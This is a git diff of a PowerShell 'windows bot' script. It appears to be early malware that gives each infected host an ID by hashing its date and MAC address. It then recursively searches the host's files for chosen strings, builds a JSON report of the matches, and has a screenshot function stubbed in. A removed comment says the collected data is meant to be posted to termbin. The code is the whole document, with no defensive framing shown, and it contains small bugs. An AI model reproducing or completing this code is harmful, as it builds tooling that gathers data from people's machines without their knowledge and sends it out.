@@ -1,17 +1,8 @@
 # windows bot 
 
-# Name:			create_json
-# Parameters:	$json_object (object json is being added to), $input_object (object to become json)
-# Return value:	returns a json object with the new values appended to it
-# Purpose:		Creates/appends json to a json object so we can post it to termbin
-function create_json($json_object, $input_object) {
-	$json_object += $input_object | convertto-json
-	
-	return $json_object
-}
 
 # Name:			create_hash
-# Parameters:	$str_to_hash (the string we want to hash with sha1)
+# Parameters:	$str_to_hash (the string we want to hash with sha256)
 # Return value:	$hashed (the hashed string)
 # Purpose:		create a hash of a string, used for bot uid
 function create_hash($str_to_hash){
@@ -37,27 +28,37 @@ function get_uid() {
 	$to_hash = $date + $mac
 	# hash the date+mac
 	$bot_uid = create_hash $to_hash
+	
+	return $bot_uid
 }
 
 # Name: 		find_string
-# Parameters: 	$string (value to search)
+# Parameters: 	$string, list of strings we are searching for
 # Return value:	returns an object containing the list of files
 # Purpose: 		find all files containing a given string
-function find_string ($string){
-	$string_a ="this is a super hard test"
-	$file1 = Get-ChildItem -recurse | select-string -pattern $string_a | convertto-json
-	$string_b = "another etest yo"
-	$file2 = get-ChildItem -recurse | select-string -pattern $string_b | convertto-json
+function find_string ($stringarray){
+	# get all the files that contain the strings we are searching for and append them to the list $files
+	foreach ($str in $stringarray){
+		$files += get-ChildItem -recurse | select-string -pattern $str | select-object -Property Filename, Linenumber, Line
+	}
+
+	# gets the uid of the bot for the returned data
+	$uid = get_uid
 	
-	$tmp_json = "" # this should be done better but for now yolohaxs
-	$files = create_json $tmp_json, $file1
-	$files = create_json $files, $file2
-	write-host "[+] json object: "
-	#write-host $files
+	# create a blank json object for us to append our findings to
+	($json = [pscustomobject]@{})
 	
-	return $files
+	# add the uid to the object 
+	$json | add-member -membertype noteproperty -name uid -value $uid
+	for($i=0; $i -le $files.length; $i++){
+		$fname = "file" + $i
+		$json | add-member -membertype noteproperty -name $fname -value $files[$i]
+	}
+	
+	echo $json |convertto-json
 }
-find_string "magic"
+$stringarray = "this is a super hard test", "another etest yo"
+find_string $stringarray
 
 # Name:			take_screenshot
 # Parameters:	None
